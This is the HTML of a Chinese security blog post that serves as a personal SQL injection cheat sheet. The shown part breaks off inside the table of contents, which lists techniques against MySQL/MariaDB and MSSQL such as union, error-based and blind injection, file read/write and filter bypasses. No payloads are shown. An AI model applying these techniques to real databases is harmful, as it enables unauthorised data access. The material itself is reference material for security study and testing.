<!DOCTYPE html><html class="has-navbar-fixed-top" lang="zh-cmn-Hans"><head><meta charset="utf-8"><title>Sql注入备忘录 - Zedd&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="ZeddYu's Blog"><meta name="description" content="自用 Sqli 备忘录，随时更新"><meta property="og:type" content="article"><meta property="og:title" content="Sql注入备忘录"><meta property="og:url" content="https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/index.html"><meta property="og:site_name" content="Zedd&#39;s Blog"><meta property="og:description" content="自用 Sqli 备忘录，随时更新"><meta property="og:locale" content="en_US"><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="article:published_time" content="2019-03-06T15:33:04.000Z"><meta property="article:modified_time" content="2021-09-27T17:45:58.720Z"><meta property="article:author" content="Zedd"><meta property="article:tag" content="Sec"><meta property="article:tag" content="sql注入"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.8.1/css/bulma.min.css"><script defer="defer" src="https://at.alicdn.com/t/font_1780077_0ad2sbnz4nz.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="/css/style.css"><script>window.ga_tid="UA-112937997-1",window.ga_api="https://blog.zeddyu.info/ga_api/*"</script><script src="https://cdn.jsdelivr.net/npm/cfga@1.0.3" async></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Zedd's Blog" type="application/atom+xml"></head><body><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation"><div class="container"><div class="navbar-brand"><div class="navbar-item navbar-logo"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://s.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=80" alt="" height="28"></div><div class="navbar-burger"><span></span><span></span><span></span></div></div><div class="navbar-menu navbar-start"> <a class="navbar-item" href="/">Index</a> <a class="navbar-item" href="/archives">Archives</a> <a class="navbar-item" href="/categories">Categories</a> <a class="navbar-item" href="/tags">Tags</a> <a class="navbar-item" href="/friends">Friends</a> <a class="navbar-item" href="/about">About</a> <a class="navbar-item" href="/advertisement">Ads</a></div><div class="navbar-menu navbar-end"> <a class="navbar-item search" title="Search" href="javascript:;"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg></a><div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc"> <a class="navbar-item" title="Table of Contents"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-list"></use></svg></a><div class="navbar-dropdown is-right"> <a class="navbar-item" href="#Mysql-基于-10-3-11-MariaDB">1&nbsp;&nbsp;<b>Mysql(基于 10.3.11-MariaDB)</b></a> <a class="navbar-item" href="#Basic">1.1&nbsp;&nbsp;Basic</a> <a class="navbar-item" href="#查看当前数据库版本">1.1.1&nbsp;&nbsp;查看当前数据库版本</a> <a class="navbar-item" href="#当前登录用户">1.1.2&nbsp;&nbsp;当前登录用户</a> <a class="navbar-item" href="#当前使用的数据库">1.1.3&nbsp;&nbsp;当前使用的数据库</a> <a class="navbar-item" href="#当前的操作系统">1.1.4&nbsp;&nbsp;当前的操作系统</a> <a class="navbar-item" href="#路径相关">1.1.5&nbsp;&nbsp;路径相关</a> <a class="navbar-item" href="#字母-数字相关">1.1.6&nbsp;&nbsp;字母/数字相关</a> <a class="navbar-item" href="#字符串截取">1.1.7&nbsp;&nbsp;字符串截取</a> <a class="navbar-item" href="#‘注释’">1.1.8&nbsp;&nbsp;‘注释’</a> <a class="navbar-item" href="#常用语句">1.1.9&nbsp;&nbsp;常用语句</a> <a class="navbar-item" href="#注入技术">1.2&nbsp;&nbsp;注入技术</a> <a class="navbar-item" href="#Union-注入">1.2.1&nbsp;&nbsp;Union 注入</a> <a class="navbar-item" href="#报错注入">1.2.2&nbsp;&nbsp;报错注入</a> <a class="navbar-item" href="#Bool-盲注">1.2.3&nbsp;&nbsp;Bool 盲注</a> <a class="navbar-item" href="#延时注入">1.2.4&nbsp;&nbsp;延时注入</a> <a class="navbar-item" href="#insert-update-delete-注入">1.2.5&nbsp;&nbsp;insert/update/delete 注入</a> <a class="navbar-item" href="#Order-by-后注入">1.2.6&nbsp;&nbsp;Order by 后注入</a> <a class="navbar-item" href="#Limit-注入">1.2.7&nbsp;&nbsp;Limit 注入</a> <a class="navbar-item" href="#Group-By-注入">1.2.8&nbsp;&nbsp;Group By 注入</a> <a class="navbar-item" href="#读写文件">1.2.9&nbsp;&nbsp;读写文件</a> <a class="navbar-item" href="#宽字节注入">1.2.10&nbsp;&nbsp;宽字节注入</a> <a class="navbar-item" href="#表名可控注入">1.2.11&nbsp;&nbsp;表名可控注入</a> <a class="navbar-item" href="#无列名注入">1.2.12&nbsp;&nbsp;无列名注入</a> <a class="navbar-item" href="#可报错时爆表名、字段名、库名">1.2.13&nbsp;&nbsp;可报错时爆表名、字段名、库名</a> <a class="navbar-item" href="#约束攻击">1.2.14&nbsp;&nbsp;约束攻击</a> <a class="navbar-item" href="#一次性注入出全部结构">1.2.15&nbsp;&nbsp;一次性注入出全部结构</a> <a class="navbar-item" href="#绕过技巧">1.3&nbsp;&nbsp;绕过技巧</a> <a class="navbar-item" href="#空格替代">1.3.1&nbsp;&nbsp;空格替代</a> <a class="navbar-item" href="#绕过关键字">1.3.2&nbsp;&nbsp;绕过关键字</a> <a class="navbar-item" href="#运算符">1.3.3&nbsp;&nbsp;运算符</a> <a class="navbar-item" href="#Reference">1.4&nbsp;&nbsp;Reference</a><hr class="navbar-divider"> <a class="navbar-item" href="#MSSQL">2&nbsp;&nbsp;<b>MSSQL</b></a> <a class="navbar-item" href="#Basic-1">2.1&nbsp;&nbsp;Basic</a> <a class="navbar-item" href="#系统库">2.1.1&nbsp;&nbsp;系统库</a> <a class="navbar-item" href="#注释">2.1.2&nbsp;&nbsp;注释</a> <a class="navbar-item" href="#查询语句">2.1.3&nbsp;&nbsp;查询语句</a> <a class="navbar-item" href="#Reference-1">2.2&nbsp;&nbsp;Reference</a></div></div> <a class="navbar-item" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-github"></use></svg></a> <a class="navbar-item" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-twitter"></use></svg></a> <a class="navbar-item" title="RSS" href="https://blog.zeddyu.info/atom.xml"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-rss"></use></svg></a></div></div></nav><section class="section"><div class="container"><article class="article content gallery" itemscope itemprop="blogPost"><h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name"> Sql注入备忘录</h1><div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile"> <span class="column is-narrow"><span>Mar 6 2019</span> <span class="second-date-block">(<time datetime="2019-03-06T15:33:04.000Z" itemprop="datePublished">Mar 6 2019</time>)</span></span> <span class="column is-narrow article-category"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-folder"></use></svg><a class="article-category-link" href="/categories/Sec/">Sec</a></span> <span class="column is-narrow"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-shalou"></use></svg> <span class="article-category-link">an hour read (About 7515 words)</span></span></div><div class="article-entry is-size-6-mobile" itemprop="articleBody"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Mysql-基于-10-3-11-MariaDB"><span class="post-toc-number">1.</span> <span class="post-toc-text">Mysql(基于 10.3.11-MariaDB)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Basic"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Basic</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#查看当前数据库版本"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">查看当前数据库版本</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#当前登录用户"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">当前登录用户</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#当前使用的数据库"><span class="post-toc-number">1.1.3.</span> <span class="post-toc-text">当前使用的数据库</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#当前的操作系统"><span class="post-toc-number">1.1.4.</span> <span class="post-toc-text">当前的操作系统</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#路径相关"><span class="post-toc-number">1.1.5.</span> <span class="post-toc-text">路径相关</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#字母-数字相关"><span class="post-toc-number">1.1.6.</span> <span class="post-toc-text">字母&#x2F;数字相关</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#字符串截取"><span class="post-toc-number">1.1.7.</span> <span class="post-toc-text">字符串截取</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#‘注释’"><span class="post-toc-number">1.1.8.</span> <span class="post-toc-text">‘注释’</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#常用语句"><span class="post-toc-number">1.1.9.</span> <span class="post-toc-text">常用语句</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#注入技术"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">注入技术</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Union-注入"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">Union 注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#判断是否可以注入"><span class="post-toc-number">1.2.1.1.</span> <span class="post-toc-text">判断是否可以注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#数值型注入"><span class="post-toc-number">1.2.1.2.</span> <span class="post-toc-text">数值型注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#字符型注入"><span class="post-toc-number">1.2.1.3.</span> <span class="post-toc-text">字符型注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#查询列数"><span class="post-toc-number">1.2.1.4.</span> <span class="post-toc-text">查询列数</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基本用法"><span class="post-toc-number">1.2.1.5.</span> <span class="post-toc-text">基本用法</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#过滤了逗号的-union-注入"><span class="post-toc-number">1.2.1.6.</span> <span class="post-toc-text">过滤了逗号的 union 注入</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#报错注入"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">报错注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#分类"><span class="post-toc-number">1.2.2.1.</span> <span class="post-toc-text">分类</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#floor"><span class="post-toc-number">1.2.2.2.</span> <span class="post-toc-text">floor</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#注入语句"><span class="post-toc-number">1.2.2.2.1.</span> <span class="post-toc-text">注入语句</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#注入原理"><span class="post-toc-number">1.2.2.2.2.</span> <span class="post-toc-text">注入原理</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#UpdateXml-有长度限制-最长32位"><span class="post-toc-number">1.2.2.3.</span> <span class="post-toc-text">UpdateXml(有长度限制,最长32位)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#注入语句-1"><span class="post-toc-number">1.2.2.3.1.</span> <span class="post-toc-text">注入语句</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#注入原理-1"><span class="post-toc-number">1.2.2.3.2.</span> <span class="post-toc-text">注入原理</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ExtractValue-有长度限制-最长32位"><span class="post-toc-number">1.2.2.4.</span> <span class="post-toc-text">ExtractValue(有长度限制,最长32位)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#注入语句-2"><span class="post-toc-number">1.2.2.4.1.</span> <span class="post-toc-text">注入语句</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#注入原理-2"><span class="post-toc-number">1.2.2.4.2.</span> <span class="post-toc-text">注入原理</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#NAME-CONST-适用于低版本，不太好用"><span class="post-toc-number">1.2.2.5.</span> <span class="post-toc-text">NAME_CONST(适用于低版本，不太好用)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Error-based-Double-Query-Injection"><span class="post-toc-number">1.2.2.6.</span> <span class="post-toc-text">Error based Double Query Injection</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#exp-5-5-5以上"><span class="post-toc-number">1.2.2.7.</span> <span class="post-toc-text">exp(5.5.5以上)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#测试未通过，存在可用性的"><span class="post-toc-number">1.2.2.8.</span> <span class="post-toc-text">测试未通过，存在可用性的</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a 